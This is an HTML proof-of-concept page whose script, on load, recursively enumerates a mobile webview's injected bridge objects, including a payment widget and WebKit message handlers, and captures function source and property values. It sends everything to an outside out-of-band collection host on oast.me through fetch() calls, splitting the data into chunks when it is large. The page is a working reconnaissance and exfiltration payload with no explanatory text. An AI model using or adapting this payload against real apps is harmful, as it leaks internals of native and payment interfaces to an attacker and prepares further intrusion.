<html><head><title>PoC</title></head>
<body>
<script>
function enumerate(obj, path, depth, maxDepth) {
  if (depth > maxDepth || !obj) return {};
  var result = {};
  var props = [];
  try { props = props.concat(Object.getOwnPropertyNames(obj)); } catch(e){}
  try { props = props.concat(Object.keys(obj)); } catch(e){}
  try {
    var proto = Object.getPrototypeOf(obj);
    if (proto && proto !== Object.prototype) {
      props = props.concat(Object.getOwnPropertyNames(proto));
    }
  } catch(e){}
  // Dedupe
  props = props.filter(function(v,i,a){ return a.indexOf(v) === i; });

  props.forEach(function(key) {
    var fullPath = path + "." + key;
    try {
      var val = obj[key];
      var type = typeof val;
      if (type === 'function') {
        result[fullPath] = {type:'function', str: val.toString().substring(0,300)};
      } else if (type === 'object' && val !== null) {
        result[fullPath] = {type:'object', keys: Object.keys(val)};
        if (depth < maxDepth) {
          var sub = enumerate(val, fullPath, depth+1, maxDepth);
          for (var k in sub) result[k] = sub[k];
        }
      } else {
        result[fullPath] = {type: type, value: String(val).substring(0,200)};
      }
    } catch(e) {
      result[fullPath] = {type:'error', msg: e.message};
    }
  });
  return result;
}

var data = {};

// Enumerate __plusSDKMobileCompat deeply
data.plusSDK = enumerate(window.__plusSDKMobileCompat, "__plusSDKMobileCompat", 0, 4);

// Enumerate __webviewPaymentWidget deeply
data.payWidget = enumerate(window.__webviewPaymentWidget, "__webviewPaymentWidget", 0, 4);

// Also enumerate webkit.messageHandlers
try {
  data.webkit = enumerate(window.webkit, "webkit", 0, 4);
} catch(e) {
  data.webkitErr = e.message;
}

// Send in chunks if too large
var json = JSON.stringify(data);
if (json.length > 4000) {
  // Split
  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/enum1?" + encodeURIComponent(JSON.stringify(data.plusSDK)));
  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/enum2?" + encodeURIComponent(JSON.stringify(data.payWidget)));
  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/enum3?" + encodeURIComponent(JSON.stringify(data.webkit || {})));
} else {
  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/enum-all?" + encodeURIComponent(json));
}

document.title = "Enumerated: " + Object.keys(data.plusSDK).length + " + " + Object.keys(data.payWidget).length + " props";
</script>
</body>
</html>
